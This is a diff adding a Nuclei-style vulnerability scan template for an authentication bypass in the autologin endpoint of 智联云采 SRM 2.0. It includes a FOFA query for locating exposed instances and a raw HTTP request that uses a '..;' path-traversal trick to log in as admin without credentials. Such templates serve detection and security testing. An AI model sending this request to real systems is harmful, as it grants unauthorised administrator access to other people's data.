@@ -1,0 +1,29 @@
+id: zhilianyuncai-autologin-Authentication-bypass
+
+info:
+  name: "智联云采SRM2.0 autologin接口身份验证绕过漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: title=="SRM 2.0"
+      智联云采SRM2.0的autologin接口在身份验证逻辑实现中存在缺陷，攻击者可利用此缺陷绕过预期的身份认证机制，无需有效凭证即可获得管理员权限，进而执行未授权的管理操作并访问敏感数据，导致系统面临严重的安全风险。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487161&idx=1&sn=a9c3f9a8939dbd3d4e62bad28bda72bc&chksm=c267bb8af510329c73ff6dd5e0539863c7a7f2542e2b882883a6a682f480a711476c1c6b31fa&token=101124693&lang=zh_CN#rd
+  tags: 智联云采
+
+
+http:
+- raw:
+  - |
+    GET /adpweb/static/..;/api/sys/app/autologin?loginName=admin HTTP/1.1
+    Host: {{Hostname}}
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: header
+    words:
+    - "Location: /adpweb/a;"
+  - type: status
+    status:
+    - 302
